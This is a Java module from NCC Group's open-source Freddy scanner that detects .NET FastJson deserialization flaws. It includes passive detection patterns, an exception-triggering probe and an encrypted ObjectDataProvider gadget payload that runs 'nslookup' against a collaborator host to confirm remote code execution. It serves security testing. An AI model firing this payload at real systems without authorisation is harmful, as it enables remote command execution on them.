// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.dotnet;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the .NET FastJson library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class FastJsonModule extends FreddyModuleBase {
    //ObjectDataProvider payload data
    private final String OBJD_PREFIX = decrypt("+ZeiRj2w+ENQ5T4sDMUxElZcms4vh5UAagpkxv2uLtqc0YBFf+Yf8FkyMF2utnQg5qq0tHsSYNGH4joITl+UMsj86LO6045pi3+m+sz3y31857z428buk+SiEHB6HjMEomZEG3ePWp8X3JId8cvq4XVQsJy0oqJFcxRCxAo0jXQpltNtVzJQjKVQVA9W0hXXYf1lNrD8l4jPDcL0rggE5zgZIhdNkBtrZa/EqL4SeXDC1hNZ6Ymul0DctQc4lM2Q5PK4ESuKdaw7a8gQiRHkDduHzSFTrvGVo7k5Dvsu5cndfp5z9DrI95k0pS/BagQeGjWE5MeXVLEw9CELyJ3ZqoOnVpRBOk5SEJfyR5nsufn2KxSLrGX136H1jD+KjO/lNWEmm2KHQZOdK41j24FPcX2lIJzCZ9ecfteIqd2JjNfsMf/0zdSg/RgRCViueBc/LlCaA62zHv2wIO0Csk6mTR1YOa3wdFisFQ7emATRzdgH25YV1Kaz7lPMfS7DG49xnBWtZrX5Y4PlYE0H5eyn1gZSwHstzr8bJvF06ikWsk/Rftzzekgy51sQnVdSXflorvprXddTdJE3jxgtq3Wqap+7jPWkMULNnR0FkEcxORraewbu6JlMevLuGmWV2HbOxk3U/yw5EvK+MPMECfLDFg==");
    private final String OBJD_SUFFIX = decrypt("4cfckJ2ZaI/SVCDmUt8wOHtNYdPDffPQ7l8QG/Qsh6c=");

    protected void initialiseModule() {
        setName("FastJson");
        setPlatform(TargetPlatform.DOTNET);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        registerPassiveScanIndicator(Pattern.compile("((\")|(%22))((\\$)|(%24))types((\")|(%22))"), IndicatorTarget.REQUEST);
        registerPassiveScanIndicator("fastJSON.deserializer.ToObject", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("{\"$types\":{\"\":\"\"}}", "fastJSON.deserializer.ToObject");

        registerActiveScanCollaboratorPayload(PN_OBJDATPRO, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_OBJDATPRO:
                return OBJD_PREFIX + "nslookup " + hostname + OBJD_SUFFIX;
        }
        return null;
    }
}
